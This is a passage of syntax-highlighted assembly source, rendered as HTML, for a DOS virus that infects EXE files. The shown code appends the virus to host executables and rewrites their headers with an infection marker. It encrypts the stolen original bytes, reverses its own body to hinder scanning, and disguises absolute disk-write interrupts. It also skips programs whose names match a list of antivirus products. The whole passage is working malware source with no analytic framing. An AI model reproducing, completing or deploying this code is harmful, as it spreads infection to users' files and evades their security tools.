                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">0eh</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;store old SS</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">infss</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">movefile</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">loadsize</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">lendx</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;compare lseek length with</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">exitexeinfect</span><span class="sc0">           </span><span class="sc1">;length of image that will</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">lenax</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;be loaded by the loader</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">exitexeinfect</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">;store length</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">    </span><span class="sc1">;new length</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ourstack</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">    </span><span class="sc1">;new stack</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">0eh</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">200h</span><span class="sc0">         </span><span class="sc1">;200h=512=one page</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc5">virus_end</span><span class="sc4">-</span><span class="sc5">exe_start</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">    </span><span class="sc1">;new length</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc12">'MS'</span><span class="sc0">  </span><span class="sc1">;marker</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">    </span><span class="sc1">;new length</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">isexe</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">genran</span><span class="sc0">                  </span><span class="sc1">;generate xor value</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">decvicdata</span><span class="sc0">              </span><span class="sc1">;encrypt the original bytes</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">enccom</span><span class="sc0">                  </span><span class="sc1">;reverse our virus</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                  </span><span class="sc1">;write virus at end</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">virus_end</span><span class="sc4">-</span><span class="sc5">exe_start</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">exe_start</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                   </span><span class="sc1">;move at start</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">movefile</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                      </span><span class="sc1">;rewrite header</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1ch</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">avrunning</span><span class="sc4">],</span><span class="sc2">02h</span><span class="sc0">
</span><span class="sc5">exitexeinfect</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">enccom</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">8d00h</span><span class="sc0">                </span><span class="sc1">;some suitable mem</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">exe_start</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">enc_start</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">            </span><span class="sc1">;copy first normal part of code</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">enc_end</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">enc_end</span><span class="sc4">-</span><span class="sc5">enc_start</span><span class="sc0">
</span><span class="sc5">critt</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">0cdh</span><span class="sc0">                 </span><span class="sc1">;is an int?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">notint</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0cdh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">026h</span><span class="sc0">                 </span><span class="sc1">;change 26 to 62, so no</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">notint</span><span class="sc0">                  </span><span class="sc1">;absolute disk writes will</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">062h</span><span class="sc0">                 </span><span class="sc1">;be noticed</span><span class="sc0">
</span><span class="sc5">notint</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">dh</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">                      </span><span class="sc1">;copy and reverse code</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">critt</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">xorvalue</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">decvicdata</span><span class="sc4">:</span><span class="sc0">                             </span><span class="sc1">;minor encryption for original bytes</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">victim_enc_data</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">xorvalue</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">          </span><span class="sc1">;6 words to encrypt</span><span class="sc0">
</span><span class="sc5">encloopy</span><span class="sc4">:</span><span class="sc0">                        </span><span class="sc1">;cs:</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">                      </span><span class="sc1">;next word</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">encloopy</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">dh</span><span class="sc0">     </span><span class="sc1">;xor com/exe marker</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">genran</span><span class="sc4">:</span><span class="sc0">                                 </span><span class="sc1">;generate random value for xoring</span><span class="sc0">
                </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">xorvalue</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">;store value</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">set_attr</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">4fh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">            </span><span class="sc1">;set attributes</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">loadsize</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">              </span><span class="sc1">;calculate lenght of loaded</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">              </span><span class="sc1">;image from header</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">512</span><span class="sc0">
                </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">lenax</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">lendx</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">antiviruses</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'TB'</span><span class="sc4">,</span><span class="sc12">'AV'</span><span class="sc4">,</span><span class="sc12">'F-'</span><span class="sc4">,</span><span class="sc12">'VI'</span><span class="sc4">,</span><span class="sc12">'SC'</span><span class="sc4">,</span><span class="sc12">'IT'</span><span class="sc4">,</span><span class="sc12">'IV'</span><span class="sc4">,</span><span class="sc12">'FI'</span><span class="sc4">,</span><span class="sc12">'NA'</span><span class="sc4">,</span><span class="sc12">'CO'</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">checkav</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc1">;check if the current program being infected is an AV</span><span class="sc0">
                </span><span class="sc1">;ds:di --&gt; '.'+1 in the filename</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc12">'\'          ;search for the \
</span><span class="sc13">                jne     checkav                         ;
</span><span class="sc0">                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">antiviruses</span><span class="sc0">
</span><span class="sc5">avcloop</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">notav</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">avrunning</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">     </span><span class="sc1">;set av flag</span><span class="sc0">
</span><span class="sc5">notav</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">avrunning</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">endscan</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">                      </span><span class="sc1">;next av signature</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">;end of the checked sigs?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">endscan</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">avcloop</span><span class="sc0">
</span><span class="sc5">endscan</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">int24h</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">    </span><span class="sc1">;much better, so on an attrib on a wp</span><span class="sc0">
                </span><span class="sc6">iret</span><span class="sc0">              </span><span class="sc1">;diskette that wouldn't be a wp warning</span><span class="sc0">
</span><span class="sc5">enc_end</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">virus_end</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">nost</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">                 </span><span class="sc1">;00h=11h/12h enabled, 1=disabled</span><span class="sc0">
</span><span class="sc5">old_int24_off</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                   </span><span class="sc1">;original int24 offset</span><span class="sc0">
</span><span class="sc5">old_int24_seg</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                   </span><span class="sc1">;original int24 segment</span><span class="sc0">

</span><span class="sc5">avrunning</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">             </span><span class="sc1">;00h av not running, 01h running</span><span class="sc0">
                                      </span><span class="sc1">;02h file succesfully infected</span><span class="sc0">
</span><span class="sc5">lenax</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">lendx</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">exeheader</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">1dh</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">size_para</span><span class="sc4">=(</span><span class="sc5">virus_end</span><span class="sc4">-</span><span class="sc5">exe_start</span><span class="sc4">+</span><span class="sc2">0fh</span><span class="sc4">)/</span><span class="sc2">10h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;virus + some temp space</span><span class="sc0">
</span><span class="sc5">lengthstack</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">1024</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">     </span><span class="sc1">;256</span><span class="sc0">

</span><span class="sc5">ourstack</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">mars</span><span class="sc0">    </span><span class="sc9">ends</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">exe_start</span><span class="sc0">
</span></div></body>
</html>
